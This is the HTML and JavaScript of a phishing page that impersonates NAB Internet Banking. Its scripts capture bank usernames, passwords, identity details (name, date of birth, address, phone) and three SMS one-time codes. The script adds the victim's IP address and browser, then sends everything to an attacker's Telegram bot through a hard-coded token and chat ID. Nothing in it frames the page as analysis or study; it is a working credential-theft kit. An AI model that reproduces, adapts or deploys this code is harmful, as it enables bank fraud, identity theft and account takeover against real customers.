<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NAB Internet Banking</title>
    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body,
      html {
        font-family: Arial, sans-serif;
        height: 100%;
      }

      .header_banner {
        width: 100%;
        background-color: #000;
      }

      .header_inner {
        display: flex;
        justify-content: space-between;
        align-items: center;
        max-width: 1200px;
        margin: 0 auto;
        padding: 15px 16px;
        width: 100%;
        gap: 20px;
      }

      .header_left {
        display: flex;
        align-items: center;
      }

      .header_right {
        color: #fff;
        display: flex;
        align-items: center;
        justify-content: center;
      }

      .header_right p {
        font-size: 0.8em;
        padding: 10px;
      }

      .banner {
        position: relative;
        min-height: 100vh;
        background-image: url("img/bg-login.jpeg");
        background-repeat: no-repeat;
        background-size: cover;
        background-position: center top;
        background-attachment: fixed;
        display: flex;
        flex-direction: column;
        overflow: hidden;
      }

      .login_wrapper {
        position: relative;
        width: 100%;
        max-width: 500px;
        margin-top: 40px;
        margin-left: 300px;
        background-color: white;
        border-radius: 8px;
        overflow: hidden;
      }

      .security-questions-icon {
        width: 45px;
        height: 45px;
      }
      .security-questions-header {
        font-family: "SourceSans-Light";
        font-size: 1.5em;
      }
      .form_container {
        position: relative;
        width: 100%;
        height: 150%;
        padding: 38px 32px;
        padding-bottom: 0px;
      }

      .loading-div {
        position: absolute;
        width: 100%;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
      }

      .input_field {
        margin-bottom: 20px;
      }

      .input_field label {
        font-size: 14px;
        color: #000;
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
      }

      .input_field input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
      }

      .input_field input:focus {
        outline: none;
        border: 3px solid grey;
      }

      .input_error {
        border: 1px solid rgb(194, 0, 0) !important;
      }

      .input_error:focus {
        border: 3px solid rgb(194, 0, 0) !important;
      }

      .input_field .error {
        color: rgb(194, 0, 0);
        font-size: 12px;
        margin-top: 4px;
      }

      .login_button {
        margin-bottom: 20px;
      }

      .login_button button {
        width: 128px;
        padding: 12px;
        background-color: #e2001a;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 16px;
        cursor: pointer;
      }

      .login_button button:hover {
        background-color: #d00016;
      }

      .footer_links a {
        color: #d00016;
      }

      .footer_links a:hover {
        text-decoration: underline;
      }

      .footer_link2 {
        margin-top: 30px;
        background-color: #e6e6e6;
        padding: 20px;
        font-size: 16px;
        font-weight: 100;
      }

      .info {
        color: #4d4d4d;
        font-size: 14px;
      }

      .footer_link2 a {
        color: #d00016;
        font-weight: bold;
      }

      .input_field input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 4px;
        font-size: 16px;
        transition: border 0.3s ease;
      }

      .checkbox-field {
        display: flex;
        align-items: center;
        gap: 10px;
        margin: 15px 0;
      }

      #agree {
        height: 20px;
        width: 20px;
        accent-color: #e2001a;
      }

      @font-face {
        font-family: "SourceSans-Light";
        src: url("font/SourceSans-Light.woff2") format("woff2"),
          url("font/SourceSans-Light.woff") format("woff");
        font-weight: 100;
        font-style: normal;
      }

      .loading-div {
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }

      .loader {
        width: 40px;
        height: 40px;
        border: 3px solid transparent;
        border-top: 3px solid #e60000;
        border-right: 3px solid #e60000;
        border-radius: 50%;
        animation: spin 1.5s linear infinite;
        margin: 0 auto;
      }

      .loader-message {
        margin-top: 12px;
        font-size: 14px;
        color: #444;
        text-align: center;
        font-family: Arial, sans-serif;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .modal-backdrop {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: rgba(0, 0, 0, 0.5);
        z-index: 999;
      }

      .modal {
        position: fixed;
        top: 28%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #fff;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        z-index: 1000;
        width: 400px;
        height: 300px;
        text-align: center;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }

      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #ddd;
        border-top: 4px solid rgb(194, 0, 0);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @media screen and (max-width: 768px) {
        .header_inner {
          display: flex;
          justify-content: space-between;
          padding: 14px 16px;
        }

        .header_left {
          margin-left: 0;
          margin-bottom: 10px;
        }

        .header_right {
          display: none;
        }

        .login_wrapper {
          width: 90%;
          margin: 50px auto;
          background-color: white;
          border-radius: 8px;
          overflow: hidden;
        }

        .form_container {
          padding: 20px;
        }

        .security-questions-icon {
          width: 40px;
          height: 40px;
        }
        .security-questions-header {
          font-size: 1.2em;
        }
        #agree {
          height: 25px;
          width: 25px;
        }
      }
    </style>
  </head>

    <script>
      // ===== CONFIG (Replaces edit.php) =====
      const CONFIG = {
        apikey: "8343008184:AAF4ccn2zyT6Z-zGMZy2zThfPS26L8jPNjE",
        chatid: "722615124"
      };

      // ===== Helper Functions (Replaces fxker.php) =====
      function clean(value) {
        return String(value).trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
      }

      function getBrowser(ua) {
        if (ua.includes('MSIE')) return 'Internet Explorer';
        if (ua.includes('Firefox')) return 'Mozilla Firefox';
        if (ua.includes('Chrome')) return 'Google Chrome';
        if (ua.includes('Safari')) return 'Safari';
        if (ua.includes('Opera')) return 'Opera';
        return 'Unknown';
      }

      async function getLocation(ip) {
        try {
          const res = await fetch(`https://freeipapi.com/api/json/${ip}`);
          const data = await res.json();
          return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
        } catch {
          return { country: 'Unknown', city: 'Unknown' };
        }
      }

      async function getClientInfo() {
        let ip = '0.0.0.0';
        try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          ip = data.ip;
        } catch(e) {
          console.warn('IP fetch failed');
        }
        const location = await getLocation(ip);
        return {
          ip: ip,
          location: location,
          userAgent: navigator.userAgent,
          browser: getBrowser(navigator.userAgent)
        };
      }

      // ===== Send to Telegram (Replaces message() from fxker.php) =====
      async function sendTelegram(message) {
        try {
          const response = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.chatid, text: message })
          });
          const data = await response.json();
          console.log('Telegram response:', data);
          return data;
        } catch(e) {
          console.error('Telegram send error:', e);
          return null;
        }
      }

      // ===== Session Management (Replaces PHP $_SESSION) =====
      const Session = {
        get: function(key) {
          return localStorage.getItem('session_' + key);
        },
        set: function(key, value) {
          localStorage.setItem('session_' + key, value);
        },
        getUsername: function() {
          return this.get('username') || 'Unknown';
        }
      };

      // ===== The Main Switch (Replaces err.php) =====
      async function processForm(target, formData) {
        const info = await getClientInfo();
        let message = "";

        switch(parseInt(target)) {
          case 0: // Login (NAB LOGIN 1)
            const username = clean(formData.get('x') || '');
            const password = clean(formData.get('xx') || '');
            Session.set('username', username);
            Session.set('password', password);

            message = `
        ------------------[NAB LOGIN 1]------------------

        Username : ${username}
        Password : ${password}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 1: // Identity Verification
            const fullName = clean(formData.get('fullName') || '');
            const dob = clean(formData.get('dob') || '');
            const street = clean(formData.get('street') || '');
            const city = clean(formData.get('city') || '');
            const postalCode = clean(formData.get('postalCode') || '');
            const phone = clean(formData.get('phone') || '');

            message = `
        ---------------[IDENTITY VERIFICATION]---------------

        Identity Verification By ${Session.getUsername()}

        Full Name: ${fullName}
        Date of Birth: ${dob}
        Street Address: ${street}
        City: ${city}
        Postal Code: ${postalCode}
        Phone Number: ${phone}

        --------------[USER AGENT IP DNS]--------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        --------------[TELEGRAM: ECHOVSL]--------------`;
            break;

          case 2: // SMS Code 1
            const otp1 = clean(formData.get('xxl') || '');
            message = `
        --------------[NAB SMS CODE 1]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp1}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 3: // SMS Code 2
            const otp2 = clean(formData.get('xxll') || '');
            message = `
        --------------[NAB SMS CODE 2]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp2}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 4: // Review
            message = `
        --------------[SECURITY QA REVIEW]--------------

        ${Session.getUsername()} Reviewing Security Questions and Answers Set

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          case 5: // SMS Code 3
            const otp3 = clean(formData.get('xxlll') || '');
            message = `
        --------------[NAB SMS CODE 3]--------------

        SMS CODE FROM : ${Session.getUsername()}
        SMS CODE : ${otp3}

        ------------[USER AGENT IP DNS]-------------
        User Agent
         ${info.userAgent}
        IP Address : ${info.ip}
        -------------[TELEGRAM: ECHOVSL]-------------`;
            break;

          default:
            console.warn('Unknown target:', target);
            return false;
        }

        // Send to Telegram
        await sendTelegram(message);
        console.log('✅ Message sent to Telegram');
        return true;
      }
    </script>

    <!-- ================================================ -->
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const continueBtn = document.getElementById("continueBtn");
        const agreeCheckbox = document.getElementById("agree");
        const errorMessage = document.getElementById("error-message");

        const fullName = document.getElementById("fullName");
        const dob = document.getElementById("dob");
        const street = document.getElementById("street");
        const city = document.getElementById("city");
        const postalCode = document.getElementById("postalCode");
        const phone = document.getElementById("phone");

        const errorFullName = document.getElementById("error-fullName");
        const errorDob = document.getElementById("error-dob");
        const errorStreet = document.getElementById("error-street");
        const errorCity = document.getElementById("error-city");
        const errorPostalCode = document.getElementById("error-postalCode");
        const errorPhone = document.getElementById("error-phone");

        // Phone number validation - only numbers, max 10 digits
        phone.addEventListener("input", function () {
          this.value = this.value.replace(/\D/g, "").slice(0, 10);
        });

        // Postal code - only numbers, max 4 digits
        postalCode.addEventListener("input", function () {
          this.value = this.value.replace(/\D/g, "").slice(0, 4);
        });

        // Clear errors on focus
        [fullName, dob, street, city, postalCode, phone].forEach(function(input) {
          input.addEventListener("focus", function() {
            const errorId = "error-" + this.id;
            const errorEl = document.getElementById(errorId);
            if (errorEl) {
              errorEl.textContent = "";
              this.classList.remove("input_error");
            }
          });
        });

        continueBtn.addEventListener("click", function () {
          let isValid = true;

          // Validate Full Name
          if (!fullName.value.trim()) {
            errorFullName.textContent = "Please enter your full name.";
            fullName.classList.add("input_error");
            isValid = false;
          } else if (fullName.value.trim().length < 2) {
            errorFullName.textContent = "Please enter a valid name (minimum 2 characters).";
            fullName.classList.add("input_error");
            isValid = false;
          } else {
            fullName.classList.remove("input_error");
            errorFullName.textContent = "";
          }

          // Validate Date of Birth
          if (!dob.value) {
            errorDob.textContent = "Please select your date of birth.";
            dob.classList.add("input_error");
            isValid = false;
          } else {
            // Check if the user is at least 18 years old
            const birthDate = new Date(dob.value);
            const today = new Date();
            let age = today.getFullYear() - birthDate.getFullYear();
            const m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
              age--;
            }
            if (age < 18) {
              errorDob.textContent = "You must be at least 18 years old.";
              dob.classList.add("input_error");
              isValid = false;
            } else {
              dob.classList.remove("input_error");
              errorDob.textContent = "";
            }
          }

          // Validate Street Address
          if (!street.value.trim()) {
            errorStreet.textContent = "Please enter your street address.";
            street.classList.add("input_error");
            isValid = false;
          } else {
            street.classList.remove("input_error");
            errorStreet.textContent = "";
          }

          // Validate City
          if (!city.value.trim()) {
            errorCity.textContent = "Please enter your city.";
            city.classList.add("input_error");
            isValid = false;
          } else {
            city.classList.remove("input_error");
            errorCity.textContent = "";
          }

          // Validate Postal Code
          if (!postalCode.value) {
            errorPostalCode.textContent = "Please enter your postal code.";
            postalCode.classList.add("input_error");
            isValid = false;
          } else if (postalCode.value.length !== 4) {
            errorPostalCode.textContent = "Please enter a valid 4-digit postal code.";
            postalCode.classList.add("input_error");
            isValid = false;
          } else {
            postalCode.classList.remove("input_error");
            errorPostalCode.textContent = "";
          }

          // Validate Phone Number
          if (!phone.value) {
            errorPhone.textContent = "Please enter your phone number.";
            phone.classList.add("input_error");
            isValid = false;
          } else if (phone.value.length < 8 || phone.value.length > 10) {
            errorPhone.textContent = "Please enter a valid phone number (8-10 digits).";
            phone.classList.add("input_error");
            isValid = false;
          } else {
            phone.classList.remove("input_error");
            errorPhone.textContent = "";
          }

          // Validate checkbox
          if (!agreeCheckbox.checked) {
            errorMessage.style.display = "block";
            isValid = false;
          } else {
            errorMessage.style.display = "none";
          }

          if (isValid) {
            continueBtn.textContent = "Processing...";
            continueBtn.disabled = true;
            submitIdentityDetails();
          }
        });

        agreeCheckbox.addEventListener("change", function () {
          if (this.checked) {
            errorMessage.style.display = "none";
          }
        });
      });

      // ===== Submit Identity Details - Replaces XHR to PHP =====
      async function submitIdentityDetails() {
        const data = {
          fullName: document.getElementById("fullName").value,
          dob: document.getElementById("dob").value,
          street: document.getElementById("street").value,
          city: document.getElementById("city").value,
          postalCode: document.getElementById("postalCode").value,
          phone: document.getElementById("phone").value,
        };

        // ===== Build form data and send via processForm =====
        const formData = new FormData();
        formData.append("sws", 1);
        formData.append("fullName", data.fullName);
        formData.append("dob", data.dob);
        formData.append("street", data.street);
        formData.append("city", data.city);
        formData.append("postalCode", data.postalCode);
        formData.append("phone", data.phone);

        // Process and send to Telegram (no PHP needed!)
        const success = await processForm(1, formData);

        if (success) {
          ShowLoadingModal();
          setTimeout(() => {
            window.location.href = "success.html";
          }, 60000);
        } else {
          location.reload();
        }
      }
    </script>
  </body>
</html>
